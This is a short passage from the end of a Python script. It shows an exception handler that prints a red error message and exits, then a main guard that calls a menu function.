        console.print(f"[bold red]ERROR: {e}[/bold red]")
        sys.exit(1)

if __name__ == "__main__":
    menu()
